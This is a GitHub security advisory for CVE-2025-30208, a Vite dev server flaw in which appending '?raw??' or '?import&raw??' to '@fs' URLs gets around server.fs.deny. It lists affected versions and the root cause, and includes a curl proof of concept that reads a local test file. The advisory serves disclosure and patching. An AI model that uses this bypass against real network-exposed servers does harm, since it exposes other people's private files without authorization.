# [M] Vite bypasses server.fs.deny when using ?raw??

## Summary
Severity: Medium
Advisory: GHSA-x574-m823-4x7w
CVE: CVE-2025-30208
CWE: CWE-200, CWE-284
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2025-03-25
Source: https://github.com/advisories/GHSA-x574-m823-4x7w
Type: github-advisory

## Affected
- npm: `vite` — affected >=6.2.0 <6.2.3
- npm: `vite` — affected >=6.1.0 <6.1.2
- npm: `vite` — affected >=6.0.0 <6.0.12
- npm: `vite` — affected >=5.0.0 <5.4.15
- npm: `vite` — affected >=0 <4.5.10

## Details
### Summary
The contents of arbitrary files can be returned to the browser.

### Impact
Only apps explicitly exposing the Vite dev server to the network (using `--host` or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host)) are affected.

### Details
`@fs` denies access to files outside of Vite serving allow list. Adding `?raw??` or `?import&raw??` to the URL bypasses this limitation and returns the file content if it exists. This bypass exists because trailing separators such as `?` are removed in several places, but are not accounted for in query string regexes.

### PoC
```bash
$ npm create vite@latest
$ cd vite-project/
$ npm install
$ npm run dev

$ echo "top secret content" > /tmp/secret.txt

# expected behaviour
$ curl "http://localhost:5173/@fs/tmp/secret.txt"

    <body>
      <h1>403 Restricted</h1>
      <p>The request url &quot;/tmp/secret.txt&quot; is outside of Vite serving allow list.

# security bypassed
$ curl "http://localhost:5173/@fs/tmp/secret.txt?import&raw??"
export default "top secret content\n"
//# sourceMappingURL=data:application/json;base64,eyJ2...
```

## References
- https://github.com/vitejs/vite/security/advisories/GHSA-x574-m823-4x7w
- https://nvd.nist.gov/vuln/detail/CVE-2025-30208
- https://github.com/vitejs/vite/commit/315695e9d97cc6cfa7e6d9e0229fb50cdae3d9f4
- https://github.com/vitejs/vite/commit/80381c38d6f068b12e6e928cd3c616bd1d64803c
- https://github.com/vitejs/vite/commit/807d7f06d33ab49c48a2a3501da3eea1906c0d41
- https://github.com/vitejs/vite/commit/92ca12dc79118bf66f2b32ff81ed09e0d0bd07ca
- https://github.com/vitejs/vite/commit/f234b5744d8b74c95535a7b82cc88ed2144263c1
- https://github.com/vitejs/vite
